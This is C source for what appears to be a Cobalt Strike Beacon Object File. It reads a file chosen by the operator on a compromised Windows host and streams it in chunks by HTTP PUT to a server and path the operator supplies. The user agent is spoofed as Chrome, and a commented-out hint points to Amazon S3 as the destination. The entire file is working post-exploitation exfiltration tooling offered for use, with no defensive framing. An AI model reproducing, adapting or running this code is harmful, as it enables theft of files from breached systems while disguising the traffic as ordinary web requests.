#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "beacon.h"

#define CHUNK_SIZE 4096
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$HttpOpenRequestA(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR *,DWORD,DWORD);
DECLSPEC_IMPORT BOOL WINAPI WININET$HttpEndRequestA(HINTERNET hRequest,LPINTERNET_BUFFERSA lpBuffersOut,DWORD dwFlags,DWORD_PTR dwContext);
DECLSPEC_IMPORT BOOL WINAPI WININET$HttpSendRequestExA(HINTERNET hRequest,LPINTERNET_BUFFERSA lpBuffersIn,LPINTERNET_BUFFERSA lpBuffersOut,DWORD dwFlags,DWORD_PTR dwContext);
DECLSPEC_IMPORT BOOL WINAPI WININET$InternetWriteFile(HINTERNET hFile,LPCVOID lpBuffer,DWORD dwNumberOfBytesToWrite,LPDWORD lpdwNumberOfBytesWritten);
DECLSPEC_IMPORT BOOL WINAPI WININET$InternetCloseHandle(HINTERNET);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE, DWORD, PVOID);

HANDLE openFile(const char* filename) {
    HANDLE hFile = KERNEL32$CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"Failed to open file %s with error %lu\n", filename, KERNEL32$GetLastError());
    }

    return hFile;
}

DWORD getFileSize(HANDLE hFile) {
    DWORD fileSize = KERNEL32$GetFileSize (hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR,"Failed to get file size with error %lu\n", KERNEL32$GetLastError());
    }
    return fileSize;
}

void go(char *args, int len) {
	datap parser;	
	BeaconDataParse(&parser, args, len);
    
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bRequestSent;
    
    //char* server = "s3.amazonaws.com";
    char* server;
    char* filename;
    server = BeaconDataExtract(&parser, NULL);
    filename = BeaconDataExtract(&parser, NULL);
    //char* name = MSVCRT$strrchr(filename, '\\');
    char* path;
    path = BeaconDataExtract(&parser, NULL);
    
    char* useragent; 
    useragent = BeaconDataExtract(&parser, NULL);
    //"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
    //MSVCRT$strcat(path, name + 1);
    DWORD dataLength = 0;
    DWORD fileSize = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwBytesRead = 0;
    char pBuffer[CHUNK_SIZE];

    // Open the file for reading
    hFile = openFile(filename);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"No handle to file");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "%d",hFile);


    // // Get the file size
    fileSize = getFileSize(hFile);
    if (fileSize == INVALID_FILE_SIZE) {
        goto cleanup;
    }
    // // Initialize the WinINet API.
    hInternet = WININET$InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        BeaconPrintf(CALLBACK_ERROR,"InternetOpen failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    // // Connect to the server.
    hConnect = WININET$InternetConnectA(hInternet, server, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR,"InternetConnect failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    // // Open an HTTP request handle.
    hRequest = WININET$HttpOpenRequestA(hConnect, "PUT", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR,"HttpOpenRequest failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    // // Initialize the request for chunked upload
    INTERNET_BUFFERS buffers = {0};
    buffers.dwStructSize = sizeof(INTERNET_BUFFERS);
    buffers.dwBufferTotal = fileSize;
    
    if (!WININET$HttpSendRequestExA(hRequest, &buffers, NULL, HSR_INITIATE, 0)) {
        BeaconPrintf(CALLBACK_ERROR,"HttpSendRequestEx failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }
    // Read the file and send in chunks
    //char buffer[CHUNK_SIZE] = "";
    LPVOID buffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, CHUNK_SIZE);
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;

    while (KERNEL32$ReadFile(hFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        if (!WININET$InternetWriteFile(hRequest, buffer, bytesRead, &bytesWritten) || bytesWritten != bytesRead) {
            BeaconPrintf(CALLBACK_ERROR,"InternetWriteFile failed with error %lu\n", KERNEL32$GetLastError());
            WININET$HttpEndRequestA(hRequest, NULL, 0, 0);
            goto cleanup;
        }
    }
    if(!WININET$HttpEndRequestA(hRequest, NULL, 0, 0)) {
        BeaconPrintf(CALLBACK_ERROR,"HttpEndRequest failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }else {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        BeaconPrintf(CALLBACK_OUTPUT,"HTTP PUT request sent successfully.\n");
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Working");
    // Clean up resources.
cleanup:
    //BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up");
    if (hFile != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(hFile);
    }
    if (hRequest != NULL){
        WININET$InternetCloseHandle(hRequest);
    }
    if (hConnect != NULL){
        WININET$InternetCloseHandle(hConnect);
    }
    if (hInternet != NULL){
        WININET$InternetCloseHandle(hInternet);
    }
    return;
}
